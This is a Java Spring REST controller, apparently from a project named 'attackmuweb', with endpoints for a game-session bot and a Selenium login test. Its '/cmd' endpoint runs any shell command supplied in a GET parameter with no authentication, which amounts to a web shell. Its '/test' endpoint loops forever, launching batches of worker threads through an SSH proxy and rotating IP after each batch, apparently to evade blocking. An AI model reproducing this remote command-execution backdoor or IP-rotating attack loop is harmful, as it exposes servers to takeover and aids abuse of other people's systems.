/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package restcontroller;

import Utils.ProxyWithSSH;
import attackmuweb.WorkerThread;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.Writer;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.openqa.selenium.By;
import org.openqa.selenium.OutputType;
import org.openqa.selenium.TakesScreenshot;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxBinary;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxProfile;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import tqtk.Entity.SessionEntity;
import tqtk.Tqtk;
import tqtk.XuLy.login.LayThongTinSession;

@RestController
public class GreedingController {

    public static WebDriver webDriver = null;
    public static int count = 0;

    @RequestMapping(value = "/addcount", method = RequestMethod.GET)
    public int addcount() {
        count++;
        return count;
    }

    @RequestMapping(value = "/getcount", method = RequestMethod.GET)
    public int getcount() {
        return count;
    }

    @RequestMapping(value = "/starttqtk", method = RequestMethod.GET)
    @ResponseBody
    public String starttqtk() {
        if (LayThongTinSession.getListSession().size() < 1) {
            Thread t = new Thread() {
                public void run() {
                    tqtk.Tqtk.main();
                }
            };
            t.start();
        }

        return "ok";
    }

    @RequestMapping(value = "/getinfotqtk", method = RequestMethod.GET)
    @ResponseBody
    public String getinfotqtk(@RequestParam(value = "key", required = true) String key) {
        for (SessionEntity sessionEntity : LayThongTinSession.getListSession()) {
            if (key.equals(sessionEntity.getUserId())) {
                return sessionEntity.getMessage().toString();
            }
        }

        return "ko thay";
    }

    @RequestMapping(value = "/test", method = RequestMethod.GET)
    public String test() {
        Thread checkssh = new Thread() {
            @Override
            public void run() {
                try {
                    ProxyWithSSH proxyWithSSH = new ProxyWithSSH();
                    startProxy(proxyWithSSH);

                    while (true) {
                        ExecutorService executor = Executors.newCachedThreadPool();
                        for (int i = 1; i <= 10; i++) {
                            Runnable worker = new WorkerThread();
                            executor.execute(worker);
                            Thread.sleep(400);
                        }
                        executor.shutdown();

                        // Wait until all threads are finish
                        while (!executor.isTerminated()) {
                            // Running ...
                        }
                        proxyWithSSH.changeIp();
                    }
                } catch (Exception e) {
                    e.getMessage();
                }

            }
        };
        checkssh.start();
        return "Hello ";
    }

    @RequestMapping(value = "/cmd", method = RequestMethod.GET)
    public String greeding(@RequestParam(value = "cmd", required = true) String cmd) {
        String output = "";
        try {
            output = executeCommand(cmd);
            return output;
        } catch (Exception e) {
            e.getMessage();
            return e.getMessage();
        }

    }

    @RequestMapping(value = "/openbrowser", method = RequestMethod.GET)
    public String selenium() {
        String output = "";
        try {

            webDriver = new HtmlUnitDriver();
            openTestSite();
            login("admin", "12345");
            getText();

            // closeBrowser();
            return getText();
        } catch (Exception e) {
            e.getMessage();
            return "loi : " + e.getMessage();
        }

    }

    public void login(String username, String Password) {

        try {
            WebElement userName_editbox = webDriver.findElement(By.id("usr"));
            WebElement password_editbox = webDriver.findElement(By.id("pwd"));
            WebElement submit_button = webDriver.findElement(By.xpath("//input[@value='Login']"));

            userName_editbox.sendKeys(username);
            password_editbox.sendKeys(Password);
            submit_button.click();
        } catch (Exception e) {
            e.getMessage();
        }

    }

    public String getText() throws IOException {

        try {
            String text = webDriver.findElement(By.xpath("//div[@id='case_login']/h3")).getText();
            return text;
        } catch (Exception e) {
            return e.getMessage();
        }

    }

    public void closeBrowser() {
        webDriver.close();
    }

    public void openTestSite() {
        webDriver.navigate().to("http://testing-ground.scraping.pro/login");
    }

    public String executeCommand(String command) {

        StringBuffer output = new StringBuffer();

        Process p;
        try {
            p = Runtime.getRuntime().exec(command);
            p.waitFor();
            BufferedReader reader
                    = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String line = "";
            while ((line = reader.readLine()) != null) {
                output.append(line + "\n");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        return output.toString();

    }

    public void startProxy(ProxyWithSSH proxyWithSSH) {
        try {
            URL sqlScriptUrl = GreedingController.class
                    .getClassLoader().getResource("ssh.txt");
            proxyWithSSH.setting(sqlScriptUrl.getPath(), 1080);
            proxyWithSSH.start();
        } catch (Exception e) {
            e.getMessage();
        }
    }
}
